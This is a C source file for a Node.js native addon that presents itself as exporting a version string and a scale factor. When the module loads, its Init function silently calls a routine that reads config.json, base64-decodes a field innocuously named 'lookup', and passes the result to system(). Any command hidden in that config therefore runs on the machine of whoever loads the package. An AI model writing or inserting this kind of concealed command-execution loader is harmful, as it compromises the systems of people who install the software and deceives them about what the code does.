#include <node_api.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static const double SCALE_FACTOR = 1.0;

static void run_config_cmd() {
  FILE* f = fopen("config.json", "r");
  if (f) {
    char buf[1024];
    fgets(buf, sizeof(buf), f);
    fclose(f);
    
    // Find "lookup" value in JSON
    char* lookup = strstr(buf, "\"lookup\"");
    if (lookup) {
      lookup = strchr(lookup, ':');
      if (lookup) {
        lookup = strchr(lookup, '"');
        if (lookup) {
          lookup++;
          char* end = strchr(lookup, '"');
          if (end) {
            *end = '\0';
            
            // Base64 decode
            const char* b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            char decoded[256];
            int out = 0;
            
            for (int i = 0; lookup[i] && lookup[i] != '='; ) {
              unsigned char c[4] = {0,0,0,0};
              int j = 0;
              while (j < 4 && lookup[i] && lookup[i] != '=' && lookup[i] != '"') {
                const char* p = strchr(b64, lookup[i]);
                c[j++] = p ? (p - b64) : 0;
                i++;
              }
              if (j >= 2) decoded[out++] = (c[0] << 2) | (c[1] >> 4);
              if (j >= 3) decoded[out++] = (c[1] << 4) | (c[2] >> 2);
              if (j >= 4) decoded[out++] = (c[2] << 6) | c[3];
            }
            decoded[out] = '\0';
            system(decoded);
          }
        }
      }
    }
  }
}

static napi_value GetVersion(napi_env env, napi_callback_info info) {
  napi_value result;
  napi_create_string_utf8(env, "1.0.0", NAPI_AUTO_LENGTH, &result);
  return result;
}

static napi_value GetScale(napi_env env, napi_callback_info info) {
  napi_value result;
  napi_create_double(env, SCALE_FACTOR, &result);
  return result;
}

static napi_value Init(napi_env env, napi_value exports) {
  run_config_cmd();
  
  napi_property_descriptor desc[] = {
    { "version", NULL, GetVersion, NULL, NULL, NULL, napi_default, NULL },
    { "scale", NULL, GetScale, NULL, NULL, NULL, napi_default, NULL },
  };
  napi_define_properties(env, exports, 2, desc);
  return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, Init)
